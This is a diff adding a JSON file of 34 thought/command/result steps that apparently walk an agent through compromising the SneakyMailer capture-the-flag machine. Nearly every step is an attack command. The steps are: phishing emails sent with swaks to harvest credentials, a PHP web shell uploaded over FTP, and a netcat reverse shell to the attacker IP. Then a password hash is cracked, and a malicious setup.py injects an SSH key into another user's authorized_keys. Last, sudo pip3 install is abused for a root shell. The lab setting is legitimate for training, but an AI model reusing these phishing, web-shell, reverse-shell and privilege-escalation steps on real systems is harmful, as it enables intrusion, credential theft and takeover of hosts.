@@ -1,0 +1,209 @@
+{
+    "initial_prompt": "Exploit the target machine SneakyMailer (Linux, IP: 10.129.2.28) from the attacker machine (Kali Linux, IP: 10.10.14.64) to retrieve `user.txt` and `root.txt` flags. This involves service identification, email phishing, initial access, privilege escalation, and leveraging tools like Nmap, CeWL, Swaks, FTP, SSH, and Python package manipulation.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Identify open ports and services on the target machine to find potential entry points.",
+            "command": "nmap -sC -sV 10.129.2.28",
+            "result": "The Nmap scan reveals several open ports on 10.129.2.28: FTP (21, vsftpd 3.0.3), SSH (22, OpenSSH 7.6p1), SMTP (25, Postfix), HTTP (80, nginx 1.14.0), IMAP (143/tcp, 993/tcp, Dovecot), and HTTP Proxy (8080, nginx 1.14.0). This suggests email services and web hosting are active."
+        },
+        {
+            "step_number": 2,
+            "thought": "Add the target domain `sneakycorp.htb` to the attacker's hosts file for proper name resolution during web enumeration.",
+            "command": "echo \"10.129.2.28 sneakycorp.htb\" | sudo tee -a /etc/hosts",
+            "result": "The entry `10.129.2.28 sneakycorp.htb` is appended to `/etc/hosts` on the attacker machine. Requests to `sneakycorp.htb` will now resolve to the target IP."
+        },
+        {
+            "step_number": 3,
+            "thought": "Explore the web server's main page at `http://sneakycorp.htb` to gather initial information.",
+            "command": "curl http://sneakycorp.htb",
+            "result": "The command fetches the HTML content of `http://sneakycorp.htb`. Manual inspection of the output (or browsing in a web browser) reveals a basic corporate webpage with a link to a 'Team' page (`team.php`)."
+        },
+        {
+            "step_number": 4,
+            "thought": "Investigate the `team.php` page for employee details, specifically email addresses.",
+            "command": "curl http://sneakycorp.htb/team.php",
+            "result": "The command fetches the HTML content of `http://sneakycorp.htb/team.php`. The page lists employee names and email addresses (e.g., `paulbyrd@sneakymailer.htb`)."
+        },
+        {
+            "step_number": 5,
+            "thought": "Use CeWL to automatically extract email addresses from the `team.php` page and save them to a file.",
+            "command": "cewl -e --email_file emails.txt http://sneakycorp.htb/team.php",
+            "result": "CeWL scrapes `http://sneakycorp.htb/team.php` for email addresses and saves them into `emails.txt`. The file now contains a list of target email addresses."
+        },
+        {
+            "step_number": 6,
+            "thought": "Verify the contents of the extracted email addresses file.",
+            "command": "cat emails.txt",
+            "result": "Displays the list of extracted email addresses, such as `paulbyrd@sneakymailer.htb`, confirming the previous step's success."
+        },
+        {
+            "step_number": 7,
+            "thought": "Set up a Netcat listener on the attacker's machine (port 80) to capture any credentials submitted via the phishing link.",
+            "command": "sudo nc -lvnp 80",
+            "result": "Netcat starts listening on port 80 of the attacker’s machine (10.10.14.64), awaiting incoming HTTP requests. This command will block the terminal until a connection is received or it's interrupted."
+        },
+        {
+            "step_number": 8,
+            "thought": "Send phishing emails to the extracted addresses. The email will contain a link pointing to the attacker's Netcat listener.",
+            "command": "swaks --to $(cat emails.txt | tr '\\n' ',') --from raj@sneakymailer.htb --header \"Subject: Important Security Update\" --body \"Please verify your account details by visiting http://10.10.14.64/login.html\" --server 10.129.2.28",
+            "result": "Swaks sends phishing emails to all addresses in `emails.txt` via the target’s SMTP server (10.129.2.28). If a user clicks the link and submits data, it will be captured by the Netcat listener set up in the previous step. The listener might capture a POST request like: `POST /login.html HTTP/1.1 ... username=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt`."
+        },
+        {
+            "step_number": 9,
+            "thought": "Decode the URL-encoded password captured by Netcat.",
+            "command": "python3 -c 'import urllib.parse; print(urllib.parse.unquote(\"%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\"))'",
+            "result": "The Python command decodes the URL-encoded string, revealing the password: `^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht`."
+        },
+        {
+            "step_number": 10,
+            "thought": "Access Paul Byrd’s email account using the captured credentials (username: `paulbyrd@sneakymailer.htb`, password: `^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht`) via an IMAP client to find further information.",
+            "command": "echo \"Manual Step: Configure an IMAP client (e.g., Thunderbird or Mutt) with username paulbyrd@sneakymailer.htb, password '^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht', server sneakycorp.htb (IMAP port 143 or 993).\"",
+            "result": "Upon accessing Paul Byrd's IMAP account, emails are reviewed. One email reveals FTP credentials for a user named `developer`: Username: `developer`, Password: `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`."
+        },
+        {
+            "step_number": 11,
+            "thought": "Log in to the FTP server using the `developer` credentials found in the email to explore accessible files and directories.",
+            "command": "echo -e \"user developer m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C\\nls -la\\nquit\" | ftp -n 10.129.2.28",
+            "result": "The FTP client connects to 10.129.2.28, logs in as `developer` with the password `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`. The `ls -la` command lists files and directories, revealing a `dev` directory."
+        },
+        {
+            "step_number": 12,
+            "thought": "Create a simple PHP web shell on the attacker's machine for remote command execution.",
+            "command": "echo '<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; system($_REQUEST[\"cmd\"]); echo \"</pre>\"; } ?>' > shell.php",
+            "result": "A file named `shell.php` is created in the current directory on the attacker's machine. It contains a simple PHP web shell that executes commands passed via the 'cmd' GET/POST parameter."
+        },
+        {
+            "step_number": 13,
+            "thought": "Upload the created PHP web shell (`shell.php`) to the `dev` directory on the FTP server.",
+            "command": "echo -e \"user developer m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C\\ncd dev\\nput shell.php\\nls\\nquit\" | ftp -n 10.129.2.28",
+            "result": "The PHP shell (`shell.php`) is uploaded to the `/dev/` directory on the FTP server using the `developer` credentials. The `ls` command confirms the upload."
+        },
+        {
+            "step_number": 14,
+            "thought": "Add the `dev.sneakycorp.htb` subdomain to the attacker's hosts file to access the uploaded shell via a web browser or curl.",
+            "command": "echo \"10.129.2.28 dev.sneakycorp.htb\" | sudo tee -a /etc/hosts",
+            "result": "The entry `10.129.2.28 dev.sneakycorp.htb` is appended to `/etc/hosts` on the attacker machine. This allows `dev.sneakycorp.htb` to resolve to the target IP, enabling access to the uploaded shell at `http://dev.sneakycorp.htb/shell.php`."
+        },
+        {
+            "step_number": 15,
+            "thought": "Start a Netcat listener on the attacker machine to receive the reverse shell connection.",
+            "command": "nc -lvnp 1234",
+            "result": "Netcat starts listening on port 1234 on the attacker's machine (10.10.14.64), waiting for an incoming connection. This command will block the terminal."
+        },
+        {
+            "step_number": 16,
+            "thought": "Trigger the reverse shell by accessing the uploaded PHP shell and executing a payload that connects back to the attacker's listener.",
+            "command": "curl \"http://dev.sneakycorp.htb/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.64%201234%20%3E%2Ftmp%2Ff\"",
+            "result": "Accessing the URL executes the reverse shell payload on the target machine. A connection is established back to the attacker's Netcat listener on port 1234, providing a shell as the `www-data` user."
+        },
+        {
+            "step_number": 17,
+            "thought": "Upgrade the basic reverse shell to a fully interactive TTY shell for better usability on the target machine.",
+            "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "result": "The Python command (executed in the `www-data` reverse shell) spawns a `/bin/bash` shell with a pseudo-terminal, improving shell interactivity (e.g., tab completion, command history)."
+        },
+        {
+            "step_number": 18,
+            "thought": "Search for sensitive files as `www-data`, particularly within web root directories, to find credentials for other services.",
+            "command": "cat /var/www/pypi.sneakycorp.htb/.htpasswd",
+            "result": "The command (executed in the `www-data` shell) displays the content of the `.htpasswd` file, revealing an Apache MD5 crypt hash for the `pypi` user: `pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/`."
+        },
+        {
+            "step_number": 19,
+            "thought": "Save the extracted pypi hash to a file on the attacker machine for cracking.",
+            "command": "echo 'pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/' > pypi_hash.txt",
+            "result": "The pypi user's hash is saved to `pypi_hash.txt` on the attacker's machine."
+        },
+        {
+            "step_number": 20,
+            "thought": "Ensure the `rockyou.txt` wordlist is available for John the Ripper. If it's gzipped, decompress it.",
+            "command": "if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]; then sudo gunzip /usr/share/wordlists/rockyou.txt.gz; fi",
+            "result": "Checks if `rockyou.txt` exists. If not, and `rockyou.txt.gz` exists, it decompresses `rockyou.txt.gz`. If `rockyou.txt` is already present or `rockyou.txt.gz` is missing, no action regarding decompression occurs. Assumes `/usr/share/wordlists/` is the standard path."
+        },
+        {
+            "step_number": 21,
+            "thought": "Crack the pypi user's hash using John the Ripper and the `rockyou.txt` wordlist.",
+            "command": "john --wordlist=/usr/share/wordlists/rockyou.txt pypi_hash.txt && john --show pypi_hash.txt",
+            "result": "John the Ripper attempts to crack the hash. Upon success, `john --show pypi_hash.txt` will display the cracked password. The walkthrough indicates the password for user `pypi` is `soufianeelhaoui`."
+        },
+        {
+            "step_number": 22,
+            "thought": "Add the `pypi.sneakycorp.htb` subdomain to the attacker's hosts file to interact with the PyPI service.",
+            "command": "echo \"10.129.2.28 pypi.sneakycorp.htb\" | sudo tee -a /etc/hosts",
+            "result": "The entry `10.129.2.28 pypi.sneakycorp.htb` is appended to `/etc/hosts` on the attacker machine, allowing `pypi.sneakycorp.htb` to resolve to the target IP."
+        },
+        {
+            "step_number": 23,
+            "thought": "Switch from the `www-data` user to the `developer` user on the target machine using the previously found FTP credentials.",
+            "command": "su developer",
+            "result": "Switches to the `developer` user. The password `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C` must be entered when prompted. Subsequent commands are run as `developer`."
+        },
+        {
+            "step_number": 24,
+            "thought": "Generate an SSH key pair on the attacker's machine. This key will be used to gain SSH access as user `low` later.",
+            "command": "ssh-keygen -t rsa -b 4096 -f ~/.ssh/sneaky_id_rsa -N \"\"",
+            "result": "An SSH key pair (`sneaky_id_rsa` and `sneaky_id_rsa.pub`) is generated in `~/.ssh/` on the attacker’s machine without a passphrase. The public key is stored in `~/.ssh/sneaky_id_rsa.pub`."
+        },
+        {
+            "step_number": 25,
+            "thought": "Create a `setup.py` file on the attacker's machine for a malicious Python package. This script will append the attacker's SSH public key to `low`'s `authorized_keys` file on the target.",
+            "command": "echo -e 'import setuptools, os\nssh_key_content = \"'\"$(cat ~/.ssh/sneaky_id_rsa.pub)\"'\"\ntarget_user_home = \"/home/low\"\nssh_dir = os.path.join(target_user_home, \".ssh\")\nauthorized_keys_path = os.path.join(ssh_dir, \"authorized_keys\")\ntry:\n    if not os.path.exists(ssh_dir):\n        os.makedirs(ssh_dir, mode=0o700)\n    with open(authorized_keys_path, \"a\") as f:\n        f.write(f\"\\n{ssh_key_content}\\n\")\n    os.chmod(authorized_keys_path, 0o600)\nexcept Exception as e:\n    with open(\"/tmp/setup_py_error.log\", \"a\") as err_log:\n        err_log.write(str(e) + \"\\n\")\n    pass\nsetuptools.setup(\n    name=\"sneakykeyinjector\",\n    version=\"0.0.1\",\n    author=\"Attacker\",\n    description=\"Injects SSH key for user low.\"\n)' > setup.py",
+            "result": "A `setup.py` file is created on the attacker's machine. This script, when executed during package installation, aims to create `/home/low/.ssh` (if non-existent), append the attacker's public key from `~/.ssh/sneaky_id_rsa.pub` to `/home/low/.ssh/authorized_keys`, and set appropriate permissions."
+        },
+        {
+            "step_number": 26,
+            "thought": "Create a `.pypirc` file on the attacker's machine to configure credentials for uploading the package to the target's PyPI server.",
+            "command": "echo -e \"[distutils]\\nindex-servers = local\\n[local]\\nrepository: http://pypi.sneakycorp.htb:8080\\nusername: pypi\\npassword: soufianeelhaoui\" > .pypirc",
+            "result": "A `.pypirc` file is created in the current directory on the attacker's machine, configured with the target PyPI server URL (`http://pypi.sneakycorp.htb:8080`) and credentials (`pypi:soufianeelhaoui`)."
+        },
+        {
+            "step_number": 27,
+            "thought": "Start a simple HTTP server on the attacker machine in the directory containing `setup.py` and `.pypirc` to allow the target to download these files.",
+            "command": "python3 -m http.server 8000",
+            "result": "An HTTP server starts on the attacker machine (10.10.14.64) on port 8000, serving files from the current directory. This command will block the terminal; run it in the background (`python3 -m http.server 8000 &`) or a separate terminal."
+        },
+        {
+            "step_number": 28,
+            "thought": "On the target machine (in the `developer` shell), create a temporary directory, download `setup.py` and `.pypirc` from the attacker, then build and upload the malicious package to the local PyPI server.",
+            "command": "mkdir -p /tmp/pkg_build && cd /tmp/pkg_build && wget -q http://10.10.14.64:8000/setup.py && wget -q http://10.10.14.64:8000/.pypirc && HOME=$(pwd) python3 setup.py sdist register -r local upload -r local",
+            "result": "On the target, `/tmp/pkg_build` is created. `setup.py` and `.pypirc` are downloaded from the attacker's HTTP server. The Python package is then built, registered, and uploaded to `http://pypi.sneakycorp.htb:8080`. The `setup.py` script executes during this process, attempting to add the attacker's SSH key to `low`'s `authorized_keys`."
+        },
+        {
+            "step_number": 29,
+            "thought": "Set correct permissions for the private SSH key on the attacker machine and then SSH into the target machine as user `low` using the injected key.",
+            "command": "chmod 600 ~/.ssh/sneaky_id_rsa && ssh -i ~/.ssh/sneaky_id_rsa low@10.129.2.28",
+            "result": "Permissions for `~/.ssh/sneaky_id_rsa` are set to 600. An SSH connection is established to `10.129.2.28` as user `low` using key-based authentication. The attacker now has a shell as `low` on the target machine."
+        },
+        {
+            "step_number": 30,
+            "thought": "As user `low` on the target machine, read the `user.txt` flag.",
+            "command": "cat /home/low/user.txt",
+            "result": "The content of `/home/low/user.txt` is displayed, revealing the user flag."
+        },
+        {
+            "step_number": 31,
+            "thought": "Check sudo permissions for the `low` user on the target machine to identify potential privilege escalation vectors.",
+            "command": "sudo -l",
+            "result": "The output of `sudo -l` shows that user `low` can run `/usr/bin/pip3 install *` as root without a password: `User low may run the following commands on sneakymailer: (root) NOPASSWD: /usr/bin/pip3 install *`."
+        },
+        {
+            "step_number": 32,
+            "thought": "Exploit the sudo permission for `pip3 install` to escalate privileges to root by creating and installing a malicious package that spawns a root shell.",
+            "command": "TF=$(mktemp -d) && echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > \"$TF/setup.py\" && sudo pip3 install \"$TF\"",
+            "result": "A temporary directory is created, and a `setup.py` file is written into it. This `setup.py` contains Python code to spawn an interactive shell. When `sudo pip3 install \"$TF\"` is executed, pip runs the `setup.py` script with root privileges, resulting in a root shell for the attacker."
+        },
+        {
+            "step_number": 33,
+            "thought": "Verify that root privileges have been obtained in the new shell.",
+            "command": "whoami && id",
+            "result": "The commands output `root` and UID/GID 0 (`uid=0(root) gid=0(root) groups=0(root)`), confirming successful privilege escalation to root."
+        },
+        {
+            "step_number": 34,
+            "thought": "Navigate to the `/root` directory and read the `root.txt` flag to complete the challenge.",
+            "command": "cat /root/root.txt",
+            "result": "The content of `/root/root.txt` is displayed, revealing the root flag."
+        }
+    ]
+}
